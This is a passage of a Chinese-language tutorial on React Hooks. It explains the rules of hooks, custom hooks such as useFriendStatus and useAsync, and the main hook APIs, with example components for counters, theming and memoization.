...\r}\r那么 React 怎么知道哪个 state 对应哪个 useState？答案是 React 靠的是 Hook 调用的顺序。因为示例中，Hook 的调用顺序在每次渲染中都是相同的，所以它能够正常工作：\n// ------------\r// 首次渲染\r// ------------\ruseState('Mary') // 1. 使用 'Mary' 初始化变量名为 name 的 state\ruseEffect(persistForm) // 2. 添加 effect 以保存 form 操作\ruseState('Poppins') // 3. 使用 'Poppins' 初始化变量名为 surname 的 state\ruseEffect(updateTitle) // 4. 添加 effect 以更新标题\r// -------------\r// 二次渲染\r// -------------\ruseState('Mary') // 1. 读取变量名为 name 的 state（参数被忽略）\ruseEffect(persistForm) // 2. 替换保存 form 的 effect\ruseState('Poppins') // 3. 读取变量名为 surname 的 state（参数被忽略）\ruseEffect(updateTitle) // 4. 替换更新标题的 effect\r// ...\r只要 Hook 的调用顺序在多次渲染之间保持一致，React 就能正确地将内部 state 和对应的 Hook 进行关联。\n如果将一个 Hook 调用放到一个条件语句中会发生什么呢？ (例如 persistForm effect)\n// 🔴 在条件语句中使用 Hook 违反第一条规则\rif (name !== '') {\ruseEffect(function persistForm() {\rlocalStorage.setItem('formData', name);\r});\r}\r在第一次渲染中 name !== '' 这个条件值为 true，所以我们会执行这个 Hook。但是下一次渲染时我们可能清空了表单，表达式值变为 false。此时的渲染会跳过该 Hook，Hook 的调用顺序发生了改变：\nuseState('Mary') // 1. 读取变量名为 name 的 state（参数被忽略）\r// useEffect(persistForm) // 🔴 此 Hook 被忽略！\ruseState('Poppins') // 🔴 2 （之前为 3）。读取变量名为 surname 的 state 失败\ruseEffect(updateTitle) // 🔴 3 （之前为 4）。替换更新标题的 effect 失败\rReact 不知道第二个 useState 的 Hook 应该返回什么。React 会以为在该组件中第二个 Hook 的调用像上次的渲染一样，对应的是 persistForm 的 effect，但并非如此。从这里开始，后面的 Hook 调用都被提前执行，导致 bug 的产生。\n这就是为什么 Hook 需要在我们组件的最顶层调用。如果我们想要有条件地执行一个 effect，可以将判断放到 Hook 的内部： useEffect(function persistForm() {\r// 👍 将条件判断放置在 effect 中\rif (name !== '') {\rlocalStorage.setItem('formData', name);\r}\r});\r2. 只在 React 函数中调用 Hook 不要在普通的 JavaScript 函数中调用 Hook。你可以：\n✅ 在 React 的函数组件中调用 Hook\n✅ 在自定义 Hook 中调用其他 Hook (我们将会在下一页 中学习这个。)\n遵循此规则，确保组件的状态逻辑在代码中清晰可见。\n三、自定义 Hook 自定义 Hook 是一种自然遵循 Hook 设计的约定，而并不是 React 的特性。\n自定义 Hook 是一种重用状态逻辑的机制(例如设置为订阅并存储当前值)，所以每次使用自定义 Hook 时，其中的所有 state 和副作用都是完全隔离的。\n通过自定义 Hook，可以将组件逻辑提取到可重用的函数中。\n这是一个聊天程序中的组件FriendListItem ，该组件用于显示好友的在线状态：\nimport React, { useState, useEffect } from 'react';\rfunction FriendListItem(props) {\r----------------------------------------------------\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange);\r};\r});\r----------------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? 'green' : 'black' }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r}\r1. 提取自定义 Hook 当想在两个函数之间共享逻辑时，把它提取到第三个函数中。而组件和 Hook 都是函数，所以也同样适用这种方式。\n自定义 Hook 是一个函数，其名称以 use 开头，函数内部可以调用其他的 Hook。\n例如，下面的 useFriendStatus 是一个自定义的 Hook:\nimport { useState, useEffect } from 'react';\rfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\ruseEffect(() =\u0026gt; {\rfunction handleStatusChange(status) {\rsetIsOnline(status.isOnline);\r}\rChatAPI.subscribeToFriendStatus(friendID, handleStatusChange);\rreturn () =\u0026gt; {\rChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange);\r};\r});\rreturn isOnline;\r}\r此处并未包含任何新的内容——逻辑是从上述组件拷贝来的（记得去掉props）。与组件中一致，请确保只在自定义 Hook 的顶层无条件地调用其他 Hook。\n2. 使用自定义 Hook 把这个逻辑提取到 FriendListItem 的自定义 Hook 中，然后就可以使用它了：\nfunction FriendListItem(props) {\r------------------------------------------\rconst isOnline = useFriendStatus(props.friend.id);\r------------------------------------------\rreturn (\r\u0026lt;li style={{ color: isOnline ? 'green' : 'black' }}\u0026gt;\r{props.friend.name}\r\u0026lt;/li\u0026gt;\r);\r}\r3. 在多个 Hook 之间传递信息 由于 Hook 本身就是函数，因此可以在它们之间传递信息。\n这是一个聊天消息接收者的选择器，它会显示当前选定的好友是否在线:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  const friendList = [ { id: 1, name: \u0026#39;Phoebe\u0026#39; }, { id: 2, name: \u0026#39;Rachel\u0026#39; }, { id: 3, name: \u0026#39;Ross\u0026#39; }, ]; function ChatRecipientPicker() { --------------------------------------------------------- //当前选择的好友 ID 保存在 recipientID 状态变量中，并在用户从 \u0026lt;select\u0026gt; 中选择其他好友时更新这个 state。  const [recipientID, setRecipientID] = useState(1); //由于 useState 为我们提供了 recipientID 状态变量的最新值， //因此我们可以将它作为参数传递给自定义的 useFriendStatus Hook：  const isRecipientOnline = useFriendStatus(recipientID); --------------------------------------------------------- return ( \u0026lt;\u0026gt; --------------------------------------------------------- //当我们选择不同的好友并更新 recipientID 状态变量时， //useFriendStatus Hook 将会取消订阅之前选中的好友，并订阅新选中的好友状态。  \u0026lt;Circle color={isRecipientOnline ? \u0026#39;green\u0026#39; : \u0026#39;red\u0026#39;} /\u0026gt; --------------------------------------------------------- \u0026lt;select value={recipientID} onChange={e =\u0026gt; setRecipientID(Number(e.target.value))} \u0026gt; {friendList.map(friend =\u0026gt; ( \u0026lt;option key={friend.id} value={friend.id}\u0026gt; {friend.name} \u0026lt;/option\u0026gt; ))} \u0026lt;/select\u0026gt; \u0026lt;/\u0026gt; ); }   4. 自定义Hooks中使用useReducer 自定义 Hook 解决了以前在 React 组件中无法灵活共享逻辑的问题。更重要的是，创建自定义 Hook 就像使用 React 内置的功能一样简单。\n尽量避免过早地增加抽象逻辑。既然函数组件能够做的更多，那么代码库中函数组件的代码行数可能会剧增。\n这属于正常现象 —— 不必立即将它们拆分为 Hook。但我们仍鼓励你能通过自定义 Hook 寻找可能，以达到简化代码逻辑，解决组件杂乱无章的目的。\n例如，有个复杂的组件，其中包含了大量以特殊的方式来管理的内部状态。useState 并不会使得集中更新逻辑变得容易，因此你可能更愿意使用 redux 中的 reducer 来编写。\n那么，为什么我们不编写一个 useReducer 的 Hook，使用 reducer 的方式来管理组件的内部 state 呢？其简化版本可能如下所示：\nfunction useReducer(reducer, initialState) {\rconst [state, setState] = useState(initialState);\rfunction dispatch(action) {\rconst nextState = reducer(state, action);\rsetState(nextState);\r}\rreturn [state, dispatch];\r}\r在组件中使用它，让 reducer 驱动它管理 state：\nfunction Todos() {\rconst [todos, dispatch] = useReducer(todosReducer, []);\rfunction handleAddClick(text) {\rdispatch({ type: 'add', text });\r}\r// ...\r}\r5. 异步 fetch Hooks 处理异步调用，应该包含以下内容：\n 创建一个接受处理函数的自定义钩子，fn. 为自定义hooks的状态定义一个 reducer 函数和一个初始状态。 使用useReducer()钩子初始化state变量和dispatch函数。 定义一个异步 run 函数，该函数将运行提供的回调 fn，同时根据需要使用 dispatch 更新 state。 返回一个包含state( value,error和loading) 和run函数的对象。  1). 封装 useAsync  ./customHooks/useAsync.ts  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  import React, { useReducer } from \u0026#39;react\u0026#39; export const useAsync = fn =\u0026gt; { //创建一个接受处理函数的自定义钩子，`fn`.  const initialState = { loading: false, error: null, value: null }; //初始化状态  const stateReducer = (_, action) =\u0026gt; {//处理状态的逻辑  switch (action.type) { case \u0026#39;start\u0026#39;: return { loading: true, error: null, value: null }; case \u0026#39;finish\u0026#39;: return { loading: false, error: null, value: action.value }; case \u0026#39;error\u0026#39;: return { loading: false, error: action.error, value: null }; } }; const [state, dispatch] = useReducer(stateReducer, initialState);//使用`useReducer()`钩子初始化`state`变量和`dispatch`函数  const run = async (args = null) =\u0026gt; {//定义一个异步 `run` 函数，该函数将运行提供的`回调 fn`，同时根据需要使用 `dispatch` 更新 `state`  try { dispatch({ type: \u0026#39;start\u0026#39; }); const value = await fn(args); dispatch({ type: \u0026#39;finish\u0026#39;, value }); } catch (error) { dispatch({ type: \u0026#39;error\u0026#39;, error }); } }; return { ...state, run };//返回一个包含`state`( `value`,`error`和`loading`) 和`run`函数的对象。 };   2). 在组件中使用  component  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  import { useAsync } from \u0026#39;./customHooks/useAsync\u0026#39;; const RandomImage = props =\u0026gt; { const imgFetch = useAsync(url =\u0026gt; fetch(url).then(response =\u0026gt; response.json()) ); return ( \u0026lt;div\u0026gt; \u0026lt;button onClick={() =\u0026gt; imgFetch.run(\u0026#39;https://dog.ceo/api/breeds/image/random\u0026#39;)} disabled={imgFetch.isLoading} \u0026gt; Load image \u0026lt;/button\u0026gt; \u0026lt;br /\u0026gt; {imgFetch.loading \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Loading...\u0026lt;/div\u0026gt;} {imgFetch.error \u0026amp;\u0026amp; \u0026lt;div\u0026gt;Error {imgFetch.error}\u0026lt;/div\u0026gt;} {imgFetch.value \u0026amp;\u0026amp; ( \u0026lt;img src={imgFetch.value.message} alt=\u0026#34;avatar\u0026#34; width={400} height=\u0026#34;auto\u0026#34; /\u0026gt; )} \u0026lt;/div\u0026gt; ); }; // ReactDOM.render(\u0026lt;RandomImage /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;));   四、ESLint 插件 React发布了一个名为 eslint-plugin-react-hooks 的 ESLint 插件来强制执行Hooks规则。\n如果项目中没有自动安装，可自行安装配置：\nyarn add --dev eslint-plugin-react-hooks\r// 你的 ESLint 配置\r{\r\u0026quot;plugins\u0026quot;: [\r// ...\r\u0026quot;react-hooks\u0026quot;\r],\r\u0026quot;rules\u0026quot;: {\r// ...\r\u0026quot;react-hooks/rules-of-hooks\u0026quot;: \u0026quot;error\u0026quot;, // 检查 Hook 的规则\r\u0026quot;react-hooks/exhaustive-deps\u0026quot;: \u0026quot;warn\u0026quot; // 检查 effect 的依赖\r}\r}\r五、Hooks API 1. useState 返回一个 state，以及更新 state 的函数。\nconst [state, setState] = useState(initialState);\r等号左边名字并不是 React API 的部分，你可以自己取名字。\n在初始渲染期间，返回的状态 (state) 与传入的第一个参数 (initialState) 值相同。\n这种 JavaScript 语法叫数组解构。等价于\nvar fruitStateVariable = useState('banana'); // 返回一个有两个元素的数组\rvar fruit = fruitStateVariable[0]; // 数组里的第一个值\rvar setFruit = fruitStateVariable[1]; // 数组里的第二个值\r1). 普通式更新state 在后续的重新渲染中，useState 返回的第一个值将始终是更新后最新的 state。\nsetState(newState);\r2). 函数式更新state 如果新的state需要通过使用先前的state计算得出，那么可以将函数传递给 setState。该函数将接收先前的 state，并返回一个更新后的值。\nfunction Counter({initialCount}) {\rconst [count, setCount] = useState(initialCount);\rreturn (\r\u0026lt;\u0026gt;\rCount: {count}\r\u0026lt;button onClick={() =\u0026gt; setCount(initialCount)}\u0026gt;Reset\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount - 1)}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; setCount(prevCount =\u0026gt; prevCount + 1)}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r}\r+ 和 - 按钮采用函数式形式，因为被更新的 state 需要基于之前的 state。但是重置按钮则采用普通形式，因为它总是把 count 设置回初始值。\n如果你的更新函数返回值与当前 state 完全相同，则随后的重渲染会被完全跳过。\n3). 合并更新对象 与 class 组件中的 setState 方法不同，useState 不会自动合并更新对象。可以用函数式的 setState 结合展开运算符来达到合并更新对象的效果。\nconst [state, setState] = useState({});\rsetState(prevState =\u0026gt; {\r// 也可以使用 Object.assign\rreturn {...prevState, ...updatedValues};\r});\ruseReducer 是另一种可选方案，它更适合用于管理包含多个子值的 state 对象。\n4). 惰性初始 state initialState 参数只会在组件的初始渲染中起作用，后续渲染时会被忽略。\n如果初始 state 需要通过复杂计算获得，则可以传入一个函数，在函数中计算并返回初始的 state，此函数只在初始渲染时被调用：\nconst [state, setState] = useState(() =\u0026gt; {\rconst initialState = someExpensiveComputation(props);\rreturn initialState;\r});\r5). 跳过 state 更新 调用 State Hook 的更新函数setState并传入当前的 state 时，React 将跳过子组件的渲染及 effect 的执行。（React 使用Object.is比较算法来比较 state。）\n需要注意的是，React 可能仍需要在跳过渲染前渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。\n如果在渲染期间执行了高开销的计算，则可以使用 useMemo 来进行优化。\n2. useEffect Effect Hook 可以让你在函数组件中执行副作用操作(改变 DOM、添加订阅、设置定时器、记录日志等)\n赋值给 useEffect 的函数会在组件渲染到屏幕之后执行。\n可以把 effect 看作从 React 的纯函数式世界通往命令式世界的逃生通道。\n默认情况下，effect 将在每轮渲染结束后执行，但你可以选择让它 在只有某些值改变的时候 才执行。\nuseEffect(didUpdate);\r1). 清除 effect 通常，组件卸载时需要清除 effect 创建的诸如订阅或计时器 ID 等资源。\n要实现这一点，useEffect 函数需返回一个清除函数。以下就是一个创建订阅的例子：\nuseEffect(() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\r// 清除订阅\rsubscription.unsubscribe();\r};\r});\r为防止内存泄漏，清除函数会在组件卸载前执行。\n另外，如果组件多次渲染（通常如此），则在执行下一个 effect 之前，上一个 effect 就已被清除。\n2). effect 的执行时机 与 componentDidMount、componentDidUpdate 不同的是，传给 useEffect 的函数会在浏览器完成布局与绘制之后，在一个延迟事件中被调用。\n这使得它适用于许多常见的副作用场景，比如设置订阅和事件处理等情况，因为绝大多数操作不应阻塞浏览器对屏幕的更新。\n虽然 useEffect 会在浏览器绘制后延迟执行，但会保证在任何新的渲染前执行。\n在开始新的更新前，React 总会先清除上一轮渲染的 effect。\n3). useLayoutEffect 然而，并非所有 effect 都可以被延迟执行。例如，一个对用户可见的 DOM 变更就必须在浏览器执行下一次绘制前被同步执行，这样用户才不会感觉到视觉上的不一致。（概念上类似于被动监听事件和主动监听事件的区别。）React 为此提供了一个额外的 useLayoutEffect Hook 来处理这类 effect。它和 useEffect 的结构相同，区别只是调用时机不同。\n它会在所有的 DOM 变更之后同步调用 effect。可以使用它来读取 DOM 布局并同步触发重渲染。在浏览器执行绘制之前，useLayoutEffect 内部的更新计划将被同步刷新。\n尽可能使用标准的 useEffect 以避免阻塞视觉更新。\n如果你正在将代码从 class 组件迁移到使用 Hook 的函数组件，则需要注意 useLayoutEffect 与 componentDidMount、componentDidUpdate 的调用阶段是一样的。\n但是，我们推荐你一开始先用 useEffect，只有当它出问题的时候再尝试使用 useLayoutEffect。\n4). SSR 服务器端渲染 如果你使用服务端渲染，请记住，无论 useLayoutEffect 还是 useEffect 都无法在 Javascript 代码加载完成之前执行。\n这就是为什么在服务端渲染组件中引入 useLayoutEffect 代码时会触发 React 告警。\n解决这个问题，需要将代码逻辑移至 useEffect 中（如果首次渲染不需要这段逻辑的情况下），或是将该组件延迟到客户端渲染完成后再显示（如果直到 useLayoutEffect 执行之前 HTML 都显示错乱的情况下）。\n若要从服务端渲染的 HTML 中排除依赖布局 effect 的组件，可以通过使用 showChild \u0026amp;\u0026amp; \u0026lt;Child /\u0026gt; 进行条件渲染，并使用 useEffect(() =\u0026gt; { setShowChild(true); }, []) 延迟展示组件。\n这样，在客户端渲染完成之前，UI 就不会像之前那样显示错乱了。\n5). effect 的条件执行1 默认情况下，effect 会在每轮组件渲染完成后执行。这样的话，一旦 effect 的依赖发生变化，它就会被重新创建。\n然而，在某些场景下这么做可能会矫枉过正。比如，在上一章节的订阅示例中，我们不需要在每次组件更新时都创建新的订阅，而是仅需要在 source prop 改变时重新创建。\n要实现这一点，可以给 useEffect 传递第二个参数，它是 effect 所依赖的值数组。\n更新后的示例如下：(此时，只有当 props.source 改变后才会重新创建订阅。)\nuseEffect(\r() =\u0026gt; {\rconst subscription = props.source.subscribe();\rreturn () =\u0026gt; {\rsubscription.unsubscribe();\r};\r},\r[props.source],\r);\r5). effect 的条件执行2 如果你要使用此优化方式，请确保数组中包含了所有外部作用域中会发生变化且在 effect 中使用的变量，否则你的代码会引用到先前渲染中的旧变量。\n如果想执行只运行一次的 effect（仅在组件挂载和卸载时执行），可以传递一个空数组（[]）作为第二个参数。\n这就告诉 React 你的 effect 不依赖于 props 或 state 中的任何值，所以它永远都不需要重复执行。这并不属于特殊情况 —— 它依然遵循输入数组的工作方式。\n如果你传入了一个空数组（[]），effect 内部的 props 和 state 就会一直持有其初始值。\n尽管传入 [] 作为第二个参数有点类似于 componentDidMount 和 componentWillUnmount 的思维模式，但它是更好的方式来避免过于频繁的重复调用 effect。\n除此之外，请记得 React 会等待浏览器完成画面渲染之后才会延迟调用 useEffect，因此会使得处理额外操作很方便。\nReact推荐启用 eslint-plugin-react-hooks 中的 exhaustive-deps 规则。此规则会在添加错误依赖时发出警告并给出修复建议。\n依赖项数组不会作为参数传给 effect 函数。虽然从概念上来说它表现为：所有 effect 函数中引用的值都应该出现在依赖项数组中。未来编译器会更加智能，届时自动创建数组将成为可能。\n3. useContext 我个人绝得，useContext 只适合用来做UI主题的传递 const value = useContext(MyContext);\r接收一个 context 对象（React.createContext 的返回值）并返回该 context 的当前值。\n当前的 context 值由上层组件中距离当前组件最近的\u0026lt;MyContext.Provider\u0026gt;的value prop决定。\n当组件上层最近的\u0026lt;MyContext.Provider\u0026gt;更新时，该 Hook 会触发重渲染，并使用最新传递给 MyContext provider 的 context value 值。\n即使祖先使用 React.memo 或 shouldComponentUpdate，也会在组件本身使用 useContext 时重新渲染。 别忘记 useContext 的参数必须是 context 对象本身：\n正确： useContext(MyContext)\n错误： useContext(MyContext.Consumer)\n错误： useContext(MyContext.Provider)\n调用了 useContext 的组件总会在 context 值变化时重新渲染。如果重渲染组件的开销较大，你可以 通过使用 memoization 来优化。\n使用方法 useContext(MyContext) 只是让你能够读取 context 的值以及订阅 context 的变化。你仍然需要在上层组件树中使用 \u0026lt;MyContext.Provider\u0026gt; 来为下层组件提供 context。\nconst themes = {\rlight: {\rforeground: \u0026quot;#000000\u0026quot;,\rbackground: \u0026quot;#eeeeee\u0026quot;\r},\rdark: {\rforeground: \u0026quot;#ffffff\u0026quot;,\rbackground: \u0026quot;#222222\u0026quot;\r}\r};\r------------------------Step1. 创建上下文----------------\rconst ThemeContext = React.createContext(themes.light);\r--------------------------------------------------------\rfunction App() {\rreturn (\r------------------------Step2. 提供上下文----------------\r\u0026lt;ThemeContext.Provider value={themes.dark}\u0026gt;\r\u0026lt;Toolbar /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r--------------------------------------------------------\r);\r}\rfunction Toolbar(props) {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;ThemedButton /\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction ThemedButton() {\r------------------------Step3. 使用上下文---------------------\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;button style={{ background: theme.background, color: theme.foreground }}\u0026gt;\rI am styled by theme context!\r\u0026lt;/button\u0026gt;\r);\r--------------------------------------------------------------\r}\r4. useReducer const [state, dispatch] = useReducer(reducer, initialArg, init);\ruseState 的替代方案。它接收一个形如 (state, action) =\u0026gt; newState 的 reducer，并返回当前的 state 以及与其配套的 dispatch 方法。（如果你熟悉 Redux 的话，就已经知道它如何工作了。）\n在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。\n并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为可以向子组件传递 dispatch 而不是回调函数。\n1). 使用方法 以下是用 reducer 重写 useState 一节的计数器示例：\nconst initialState = {count: 0};\rfunction reducer(state, action) {\rswitch (action.type) {\rcase 'increment':\rreturn {count: state.count + 1};\rcase 'decrement':\rreturn {count: state.count - 1};\rdefault:\rthrow new Error();\r}\r}\rfunction Counter() {\rconst [state, dispatch] = useReducer(reducer, initialState);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: 'decrement'})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: 'increment'})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r}\r2). 指定初始 state 有两种不同初始化 useReducer state 的方式，可以根据使用场景选择其中的一种。\n将初始 state 作为第二个参数传入 useReducer 是最简单的方法：\nconst [state, dispatch] = useReducer(\rreducer,\r{count: initialCount}\r);\rReact 不使用 state = initialState 这一由 Redux 推广开来的参数约定。\n有时候初始值依赖于 props，因此需要在调用 Hook 时指定。\n如果特别喜欢Redux的参数约定，可以通过调用 useReducer(reducer, undefined, reducer) 来模拟 Redux 的行为，但React不鼓励这么做。\n3). 惰性初始化 可以选择惰性地创建初始 state。为此，需要将 init 函数作为 useReducer 的第三个参数传入，这样初始 state 将被设置为 init(initialArg)。\n这么做可以将用于计算 state 的逻辑提取到 reducer 外部，这也为将来对重置 state 的 action 做处理提供了便利：\nfunction init(initialCount) {\rreturn {count: initialCount};\r}\rfunction reducer(state, action) {\rswitch (action.type) {\rcase 'increment':\rreturn {count: state.count + 1};\rcase 'decrement':\rreturn {count: state.count - 1};\rcase 'reset':\rreturn init(action.payload);\rdefault:\rthrow new Error();\r}\r}\rfunction Counter({initialCount}) {\rconst [state, dispatch] = useReducer(reducer, initialCount, init);\rreturn (\r\u0026lt;\u0026gt;\rCount: {state.count}\r\u0026lt;button\ronClick={() =\u0026gt; dispatch({type: 'reset', payload: initialCount})}\u0026gt;\rReset\r\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: 'decrement'})}\u0026gt;-\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={() =\u0026gt; dispatch({type: 'increment'})}\u0026gt;+\u0026lt;/button\u0026gt;\r\u0026lt;/\u0026gt;\r);\r}\r4). 跳过 dispatch 如果 Reducer Hook 的返回值与当前 state 相同，React 将跳过子组件的渲染及副作用的执行。（React 使用 Object.is 比较算法 来比较 state。）\n需要注意的是，React 可能仍需要在跳过渲染前再次渲染该组件。不过由于 React 不会对组件树的“深层”节点进行不必要的渲染，所以大可不必担心。\n如果你在渲染期间执行了高开销的计算，则可以使用 useMemo 来进行优化。\n5. useCallback const memoizedCallback = useCallback(\r() =\u0026gt; {\rdoSomething(a, b);\r},\r[a, b],\r);\r返回一个 memoized 回调函数。\nMemoization 在函数式编程语言的编译器中大量使用，这些语言通常使用按名称调用评估策略。\n为了避免计算参数值的开销，这些语言的编译器大量使用称为thunk 的辅助函数来计算参数值，并记住这些函数以避免重复计算。\n把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。\n当把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。 useCallback(fn, deps) 相当于 useMemo(() =\u0026gt; fn, deps)。\n依赖项数组不会作为参数传给回调函数。虽然从概念上来说它表现为：所有回调函数中引用的值都应该出现在依赖项数组中。未来编译器会更加智能，届时自动创建数组将成为可能。\nReact推荐启用 eslint-plugin-react-hooks 中的 exhaustive-deps 规则。此规则会在添加错误依赖时发出警告并给出修复建议。\n1. useCallback()的目的 React 组件中通常会创建共享相同代码的不同函数对象：\n1 2 3 4 5 6 7 8  function MyComponent() { // handleClick 在每次渲染时重新创建  const handleClick = () =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }; // ... }   handleClick是MyComponent每次渲染的不同函数对象。\n因为内联函数很便宜，所以在每次渲染时重新创建函数不是问题。每个组件有几个内联函数是可以接受的。\n但在某些情况下，需要在渲染之间维护单个函数实例：\n 函数组件里面包裹一个接受函数对象的props的React.memo() 当函数对象依赖于其他钩子时，例如 useEffect(..., [callback]) 当函数有一些内部状态时，例如去抖动函数\n（基本上去抖动确保为可能发生多次的事件发送恰好一个信号。\n节流将函数接收的调用频率限制在一个固定的时间间隔内。它用于确保目标函数的调用频率不会超过指定的延迟。）。  这useCallback(callbackFun, deps)有用的时候：给定相同的依赖值deps，钩子在渲染之间返回相同的函数实例（又名记忆）：\n1 2 3 4 5 6 7 8  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // handleClick is the same function object  const handleClick = useCallback(() =\u0026gt; { console.log(\u0026#39;Clicked!\u0026#39;); }, []); // ... }   handleClick 变量在 MyComponent 的渲染之间始终具有相同的回调函数对象。\n2. useCallback的正确用例 想象一下，你有一个呈现大量数据列表的组件：\nimport useSearch from './fetch-items';\rfunction MyBigList({ term, onItemClick }) {\rconst items = useSearch(term);\rconst map = item =\u0026gt; \u0026lt;div onClick={onItemClick}\u0026gt;{item}\u0026lt;/div\u0026gt;;\rreturn \u0026lt;div\u0026gt;{items.map(map)}\u0026lt;/div\u0026gt;;\r}\rexport default React.memo(MyBigList);\r列表可能很大，可能有数百个项目。为了防止无用的列表重新呈现，将其包装到React.memo().\nMyBigList 的父组件提供了一个知道何时单击了一个项目的处理函数：\nimport { useCallback } from 'react';\rexport function MyParent({ term }) {\r--------------------------------------------------------\rconst onItemClick = useCallback(event =\u0026gt; {\rconsole.log('You clicked ', event.currentTarget);\r}, [term]);\r--------------------------------------------------------\rreturn (\r\u0026lt;MyBigList\rterm={term}\ronItemClick={onItemClick}\r/\u0026gt;\r);\r}\ronItemClick回调由useCallback()处理. 只要term是相同的，useCallback()就返回相同的函数对象。\n当MyParent组件重新渲染时，onItemClick函数对象保持不变并且不会破坏MyBigList.\n这就是useCallback()的目的和正确用法。\n3. useCallback的糟糕用例 1 2 3 4 5 6 7 8 9 10 11 12  import { useCallback } from \u0026#39;react\u0026#39;; function MyComponent() { // `useCallback()` 被无脑地使用,在这里毫无意义  const handleClick = useCallback(() =\u0026gt; { // 处理点击事件  }, []); return \u0026lt;MyChild onClick={handleClick} /\u0026gt;; } function MyChild ({ onClick }) { return \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;; }   通过使用useCallback()增加了代码复杂性。必须使depsofuseCallback(..., deps)与你在记忆化回调中使用的内容保持同步。\n总之，优化比没有优化的成本更高。\n在这里，完全可以如此处理：\nimport { useCallback } from 'react';\rfunction MyComponent() {\rconst handleClick = () =\u0026gt; {\r// handle the click event\r};\rreturn \u0026lt;MyChild onClick={handleClick} /\u0026gt;;\r}\rfunction MyChild ({ onClick }) {\rreturn \u0026lt;button onClick={onClick}\u0026gt;I am a child\u0026lt;/button\u0026gt;;\r}\r4). 总结（所有性能优化的建议） 在考虑性能调整时，请记住以下语句：\n 在优化之前先分析  在决定使用优化技术时，包括记忆化，特别是useCallback()，请执行以下操作：\n 第一 分析 然后量化增加的性能（例如150ms与50ms渲染速度增加）  然后问问自己：与增加的复杂性相比，增加的性能值得使用 useCallback() 吗？\n6. useMemo 可以把 useMemo 作为性能优化的手段，但不要把它当成语义上的保证。\n将来，React 可能会选择“遗忘”以前的一些 memoized 值，并在下次渲染时重新计算它们，比如为离屏组件释放内存。\n先编写在没有 useMemo 的情况下也可以执行的代码 —— 之后再在代码中添加 useMemo，以达到优化性能的目的。\nconst memoizedValue = useMemo(() =\u0026gt; computeExpensiveValue(a, b), [a, b]);\r在初始渲染期间，useMemo(compute, dependencies)调用compute，记忆计​​算结果，并将其返回给组件。\n如果在下一次渲染期间依赖项没有改变，则 useMemo() 不会调用 compute 但返回记忆值。\n但是如果在重新渲染期间依赖项发生变化，则 useMemo() 调用 compute，记忆新值并返回它。\n这就是useMemo()钩子的本质。\n如果你的计算回调使用props或state值，请确保将这些值指示为依赖项：\nconst memoizedResult = useMemo(() =\u0026gt; {\rreturn expensiveFunction(propA, propB);\r}, [propA, propB]);\r1). useMemo() 一个例子 组件\u0026lt;CalculateFactorial /\u0026gt;计算输入字段的数字的阶乘。\n这是\u0026lt;CalculateFactorial /\u0026gt;组件的可能实现：\nimport { useState } from 'react';\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\rconst factorial = factorialOf(number);\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026quot;number\u0026quot; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log('factorialOf(n) called!');\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r}\r每次更改输入值时，都会计算阶乘factorialOf(n)并\u0026rsquo;factorialOf(n) called!\u0026lsquo;记录到控制台。\n另一方面，每次单击重新渲染按钮时，inc状态值都会更新。更新inc状态值会触发\u0026lt;CalculateFactorial 